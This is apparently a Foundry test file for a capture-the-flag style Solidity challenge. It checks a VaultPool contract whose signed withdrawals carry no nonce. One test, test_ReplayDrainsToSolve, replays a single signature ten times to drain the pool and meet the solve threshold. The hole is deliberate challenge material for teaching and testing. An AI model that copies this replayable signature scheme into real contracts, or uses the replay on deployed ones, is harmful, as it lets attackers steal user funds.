// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "@infra/MockERC20.sol";
import {VaultPool, IERC20} from "../src/VaultPool.sol";

contract VaultPoolTest is Test {
    MockERC20 token;
    VaultPool pool;
    uint256   signerKey = 0xA11CE;
    address   signer;
    address   player = makeAddr("player");

    function setUp() public {
        signer = vm.addr(signerKey);
        token = new MockERC20("Vault Token", "VLT", address(this), 1_000_000 ether);
        pool  = new VaultPool(signer, IERC20(address(token)));
        token.transfer(address(pool), 1_000_000 ether);
    }

    function _sign(address to, uint256 amount) internal view returns (bytes memory) {
        bytes32 inner  = keccak256(abi.encodePacked("Withdraw", to, amount));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", inner));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, digest);
        return abi.encodePacked(r, s, v);
    }

    function test_OneWithdrawWorks() public {
        bytes memory sig = _sign(player, pool.AUTHORIZED_AMOUNT());
        vm.prank(player);
        pool.withdraw(player, pool.AUTHORIZED_AMOUNT(), sig);
        assertEq(token.balanceOf(player), 100 ether);
    }

    function test_ReplayDrainsToSolve() public {
        bytes memory sig = _sign(player, pool.AUTHORIZED_AMOUNT());
        vm.startPrank(player);
        for (uint i = 0; i < 10; i++) {
            pool.withdraw(player, pool.AUTHORIZED_AMOUNT(), sig);
        }
        vm.stopPrank();
        assertGe(token.balanceOf(player), pool.SOLVE_THRESHOLD());
        assertTrue(pool.isSolved(player), "should be solved at threshold");
    }

    function test_BystanderCannotReplaySignerForPlayer() public {
        bytes memory sig = _sign(player, pool.AUTHORIZED_AMOUNT());
        // The require(msg.sender == to) gate stops a bystander from
        // collecting on the player's signature.
        address bystander = makeAddr("bystander");
        vm.prank(bystander);
        vm.expectRevert(bytes("only recipient"));
        pool.withdraw(player, pool.AUTHORIZED_AMOUNT(), sig);
    }

    function test_WrongAmountReverts() public {
        bytes memory sig = _sign(player, pool.AUTHORIZED_AMOUNT());
        vm.prank(player);
        vm.expectRevert(bytes("tf"));
        pool.withdraw(player, 200 ether, sig);
    }
}
